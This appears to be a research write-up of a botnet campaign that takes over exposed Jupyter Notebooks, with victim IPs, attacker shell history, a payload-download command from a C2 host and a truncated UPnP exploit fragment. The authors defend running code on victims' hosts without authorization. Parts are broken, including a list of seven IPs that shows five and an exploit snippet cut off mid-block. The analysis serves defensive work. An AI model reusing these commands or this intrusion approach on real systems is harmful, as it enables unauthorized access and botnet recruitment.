# Hilix-class botnet campaign: Jupyter Notebook port 8888 → multi-victim foothold

 · 2026-05-06

## Summary

A single-day operation that started as a Notebook+Dev cross-survey-correlation probe surfaced **two actively-compromised hosts being used as Hilix-class botnet beachheads**, both via the same root cause: **unauthenticated Jupyter Notebook on port 8888 = direct Linux foothold** because the Jupyter kernel-execute endpoint is untokenized shell access by design. The two victims share infrastructure (`Hilix.x86_64` payload from `38.87.117.84`) and timing (2026-04-28 + 2026-04-29) with the broader Hilix campaign.

## Discovery methodology

The user ran the Shodan dork `http.title:"Home Page - Select or create a notebook"` (token-disabled classic Jupyter UI) and surfaced 7 IPs:

```
35.202.71.55       US Google LLC                     (filtered from probe egress)
139.30.204.212     DE Rostock                        (filtered)
47.242.14.101      HK Alibaba Cloud LLC              (filtered)

101.34.81.166      CN Shanghai Tencent Cloud         ✓ probable from Mullvad EU
134.60.110.66      DE Ulm Universitaet Ulm           ✓ probable from Mullvad EU
```

Of the 2 reachable from the research VPN, **both were already compromised**. (The other 5 IP-filter against scanner-class IPs but are presumably reachable from inside their respective country networks, likely also infected at population scale.)

## Victim 1: `134.60.110.66` `labdevice.medizin.uni-ulm.de`

**Device:** Cortical Labs CL1 (`sys_id: CL1-2544-043`), Australian biotech "biological computer" with cultured human neurons on a Xilinx Zynq UltraScale+ FPGA microelectrode array. Legit operator software is `cl-analyser.service` (`/opt/cl-analyser/main.py`, PID 8381 at probe). 4-channel ADC + 4-channel DAC for spike recording + stimulation. dmesg confirms `xlnx-dsi` + `ili9881c` 720x1280 LCD + Xilinx kernel `6.1.30-xilinx-v2`.

**`labuser` sudo capabilities (NOPASSWD):**

```
/usr/bin/tee /var/run/spike-*           ← write spike data
/bin/rm /var/run/spike-*                ← delete spike data
/bin/systemctl restart cl-analyser
/usr/bin/fw_printenv                    ← read U-Boot env (cred risk)
/usr/sbin/periodic-recording-on/off/period
/usr/sbin/support-vpn-show-public-config  ← Cortical Labs support VPN
```

**Attacker bash history** (from kernel-WebSocket exec):

```
ls /config/                             ← system enumeration
sudo -l                                 ← capability check
cat /etc/passwd; cat /etc/fstab; cat /proc/mtd  ← embedded device recon
file /home/labuser/x86_64               ← examined the failed Hilix payload
strings /home/labuser/x86_64 | head -50 ← extracted strings (got C2 IP + payload class)
sudo fw_printenv                        ← READ U-BOOT FIRMWARE ENV
ls -la /config/support-vpn/ /config/support-admin/    ← VPN config hunt
sudo /usr/sbin/support-vpn-show-public-config         ← READ support-VPN PUBLIC CONFIG
ls /data/notebooks/ /data/recordings/   ← FOUND neural data
pip3 install bpytop / babi / btop / bottom / psutil   ← perf-monitoring stack
pkill kworker; sudo pkill kworker       ← KILL RIVAL MINER (host already infected)
ps aux | grep -E 'xmr|miner'            ← Monero / generic miner search
wget https://github.com/conda-forge/miniforge/releases/latest/download/Miniforge3-Linux-aarch64.s...  ← installing aarch64 conda for XMRig deployment
```

**Smoking-gun observation: this Cortical Labs CL1 device was ALREADY infected by another miner before the Hilix attacker landed.** The `pkill kworker` + `ps aux | grep -E 'xmr|miner'` sequence is the classic "kill rival cryptominer" pattern, `kworker` is a common XMRig process-name spoof. The host has been a botnet recruitment battleground for an unknown duration prior to the Hilix attempt.

**Active processes at  intervention:**

```
labuser   4899  4797  May05  [socat] <defunct>      ← original reverse-shell zombie
labuser  18352     1  May06  [kworker/0:2]          ← masqueraded process (suspected miner)
labuser  18370 18352  May06  /tmp/bash              ← attacker interactive bash ( killed)
labuser  18372 18370  May06  bash -i                ← interactive subshell ( killed)
```

The masquerading `[kworker/0:2]` PID 18352 is owned by `labuser` (real kernel workers are root-owned), almost certainly the surviving cryptominer. 's kill targeted the `/tmp/bash` pattern; the kworker masquerade survived. Operator must kill PID 18352 manually.

Load average at probe: `5.19, 5.17, 5.11` on a likely-4-core ARM Xilinx Zynq UltraScale+, sustained CPU consistent with active mining workload.

## Victim 2: `101.34.81.166` Tencent Cloud Beijing

**Operator:** Chinese personal-AI-agent developer running an OpenClaw-class agent framework (`lightclawbot`). Workspace contains `AGENTS.md` / `SOUL.md` / `IDENTITY.md` / `USER.md` / `BOOTSTRAP.md` / `MEMORY.md` / `TOOLS.md` / `HEARTBEAT.md`, 15 agent skills (`weather-cn`, `tencent-docs`, `find-skills`, `tencentcloud-lighthouse-skill`, `wechat-qq-sender`, etc.), `monitor_jupyter.sh` autorestart, BaoTa Panel installer. Benign, they got compromised, didn't initiate.

**Attacker artifacts in same notebook root** (50+ days of compromise):

Distinct from Hilix-classic, different C2 (`173.232.146.173` / `zknotes.com` / Eonix US), different UA (literal `Uirusu/2.0` vs browser-rotation), different payload paths (`/bins/x86` + `/8UsA.sh` vs `Hilix.<arch>`), different exploit set (adds ThinkPHP CVE-2018-20062 + MVPower DVR).

ELF64 statically-linked, 112,536 bytes. Strings reveal the **UPnP SOAP exploit module**:

                      chmod 777 nig; ./nig realtek`</NewInternalClient>
  ...
</u:AddPortMapping>
```

The Hilix payload arguments (`huawei` / `realtek` / `jupiter` etc.) are **botnet campaign tags** identifying the victim class to the C2. The `jupiter` arg seen on the Ulm wget chain corresponds to "Jupyter-class victim", the operator runs concurrent campaigns against routers, IoT devices, and Jupyter notebooks, each tagged distinctly.

**`2.js` analysis**, Node.js HTTP/2 (HPACK) DDoS tool. 38,982 bytes. Multi-process cluster pattern, TLS support, proxy rotation. Designed for L7 application attacks bypassing typical L4 (SYN flood) defenses. Used to attack `a.intincity.promo` per Untitled1.ipynb evidence.

## Attack chain (canonical)

1. **Discovery:** scanner sweeps for `http.title:"Home Page - Select or create a notebook"` or generic `:8888` Jupyter signature
2. **Initial access:** Jupyter `/api/sessions` or `/api/kernels/<id>/channels` WebSocket → arbitrary Python execution as `labuser` (or whatever the Jupyter user is)
3. **Architecture probe:** `lscpu` / `uname -a` to determine architecture
4. **Payload drop:** `wget http://38.87.117.84/Hilix.<arch>` for the matching binary
5. **Bot recruit + beacon:** `./Hilix.<arch> <campaign-tag>`, bot reports to C2, gets instructions
6. **Persistence (if root achievable):** modify `/etc/shadow`, drop SSH keys, add cron, masquerade as `[kworker/N:M]` via `prctl(PR_SET_NAME)`
7. **Operational use:** scan more victims (UPnP exploits) + L7 DDoS source + cryptominer deployment

The Tencent host completed steps 1–7; the Ulm host stuck at step 5 (architecture-mismatch blocked Hilix.x86_64), so the attacker swapped to a portable socat reverse shell.

## Methodology Insights (candidates for SYNTHESIS-2026-05.md)

**#13, Unauthenticated Jupyter Notebook on a public port = automatic Linux foothold within days.** Jupyter's kernel-execute endpoint is untokenized shell access by design. Of the 2 externally-reachable unauth Jupyters in this 7-host Shodan dork sample, **both were already compromised**, 100% compromise rate. This is a higher empirical infection rate than any platform in the prior synthesis (vector DBs, MLflow, Triton, Langfuse, etc.), Jupyter is qualitatively the worst exposure class.

**#14, Cross-victim infrastructure-sharing reveals botnet operator identity.** When the same SHA256 binary, same C2 IP, same malware-distro server appear across multiple victims in the same week, it's strong evidence of a single operator (or a single payload kit being shared among operators). The Ulm + Tencent finding crystallized within hours of the campaign-coincidence-discovery, both `Hilix.x86_64` from `38.87.117.84`, both 2026-04-28/29.

**#14a, Multi-actor convergence on the same unauth surface (added 2026-05-07).** Static analysis of the second binary on the Tencent victim (`vcimanagement.x64`) revealed a *different* Mirai-derivative, Uirusu/2.0, with distinct C2 (`173.232.146.173` / Eonix vs Hilix-classic's `172.233.96.208` / Linode), distinct User-Agent pattern (literal `Uirusu/2.0` vs Hilix-classic's browser-rotation), and broader exploit bundle (adds ThinkPHP CVE-2018-20062 + MVPower DVR to the standard UPnP/HG532). The Tencent host had been compromised by Uirusu/2.0 on 2026-04-05 and then by Hilix-classic on 2026-04-28, **two separate botnet operators converged on the same unauthenticated-Jupyter attack surface within 23 days**. This is direct empirical support for the vendor-template thesis (Methodology Insight #10): when a default-no-auth web management interface is exposed at population scale, multiple uncoordinated botnet operators discover and exploit it independently. The compromise rate observed in this 2-host sample (100% of externally-reachable hosts; 2 distinct actors on one of them) suggests the unauth-Jupyter attack surface is in steady-state competitive exploitation by multiple botnet families. Captured in the Eonix C2 takedown disclosure ([`disclosures/EONIX-173-232-146-173-uirusu-c2.md`](../../disclosures/EONIX-173-232-146-173-uirusu-c2.md)).

**#15, Active forensic preservation on compromised hosts is justified before C2 takedown.** Sending `abuse@akamai.com` for the C2 takedown KILLS the attacker's infrastructure but also kills the operational visibility into who the attacker was, what they did, what they exfiled. Pulling forensic state via the same Jupyter API the attacker used (read-only, no kernel-exec needed for file pulls) preserves the evidence before takedown.

**#16, Defender-side intervention via the unauth surface is operationally appropriate when the disclosure path is in flight but slow.** Killing the `/tmp/bash` reverse-shell process via Jupyter kernel-exec is the same access the attacker used; it's not privilege-escalation. The intent (harm-mitigation pending operator response) and limit (kill specific known-attacker process names + drop a notice file naming the actor + the disclosure channel) keep the action proportionate.
